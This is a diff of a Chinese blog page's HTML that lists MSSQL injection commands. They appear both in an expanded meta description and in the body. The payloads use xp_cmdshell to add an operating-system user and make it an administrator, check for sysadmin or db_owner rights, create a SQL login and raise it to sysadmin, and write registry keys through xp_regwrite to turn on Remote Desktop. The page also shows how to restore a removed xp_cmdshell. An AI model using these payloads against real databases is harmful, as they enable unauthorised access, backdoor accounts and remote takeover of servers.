@@ -7,7 +7,21 @@
   <meta name="author" content="xiaofeng">
   
   <meta name="description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
-用xp_cmdshell执行命令;exec mas">
+用xp_cmdshell执行命令;exec master..xp_cmdshell “net user name password /add”–
+;exec master..xp_cmdshell “net localgroup name administrators /add”–
+查看权限and (select IS_SRVROLEMEMBER(‘sysadmin’))=1–  //sa
+and (select IS_MEMBER(‘db_owner’))=1–   //  dbo
+and (select IS_MEMBER(‘public’))=1–  //public
+创建个登陆mssql的帐号;exec master.dbo.sp_addlogin name,pass;–
+把创建的mssql登陆帐号提升到sysadmin;exec master.dbo.sp_addsrvrolemember name,sysadmin;–
+开3389远程端口‘exec master..xp_regwrite @r,’software\microsoft\windows\currentversion\netcache’,’enable’,’reg_sz’,’0′;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’software\microsoft\windows nt\currentversion\winlogon’,’shutdownwithoutlogon’,’reg_sz’,’0′;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’software\policies\microsoft\windows\installer’,’enableadmintsremote’,’reg_dword’,1;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\control\terminal server’,’Tsenabled’,’reg_dword’,1;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termdd’,’start’,’reg_dword’,2;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termservice’,’start’,’reg_dword’,2;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite ‘hkey_users’,’.default\keyboard layout\toggle’,’hotkey’,’reg_sz’,’1′;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_cmdshell ‘iisreset /reboot’;—-">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -83,7 +97,8 @@ and (select IS_MEMBER(‘public’))=1–  //public
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termservice’,’start’,’reg_dword’,2;—-
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite ‘hkey_users’,’.default\keyboard layout\toggle’,’hotkey’,’reg_sz’,’1′;—-
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_cmdshell ‘iisreset /reboot’;—-
-</code></pre><h2 id="xp-cmdshell的删除及恢复"><a href="#xp-cmdshell的删除及恢复" class="headerlink" title="xp_cmdshell的删除及恢复"></a>xp_cmdshell的删除及恢复</h2><h4 id="1、恢复xp-cmdshell的方法"><a href="#1、恢复xp-cmdshell的方法" class="headerlink" title="1、恢复xp_cmdshell的方法"></a>1、恢复xp_cmdshell的方法</h4><p>删除扩展存储过过程xp_cmdshell的语句   </p>
+</code></pre><a id="more"></a>
+<h2 id="xp-cmdshell的删除及恢复"><a href="#xp-cmdshell的删除及恢复" class="headerlink" title="xp_cmdshell的删除及恢复"></a>xp_cmdshell的删除及恢复</h2><h4 id="1、恢复xp-cmdshell的方法"><a href="#1、恢复xp-cmdshell的方法" class="headerlink" title="1、恢复xp_cmdshell的方法"></a>1、恢复xp_cmdshell的方法</h4><p>删除扩展存储过过程xp_cmdshell的语句   </p>
 <pre><code>exec sp_dropextendedproc ’xp_cmdshell’  
 </code></pre><h4 id="2、恢复cmdshell的sql语句"><a href="#2、恢复cmdshell的sql语句" class="headerlink" title="2、恢复cmdshell的sql语句"></a>2、恢复cmdshell的sql语句</h4><pre><code>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’  
 exec master.dbo.addextendedproc ’xp_cmdshell’,’xplog70.dll’;select count(*) from master.dbo.sysobjects where xtype=’x’ and   
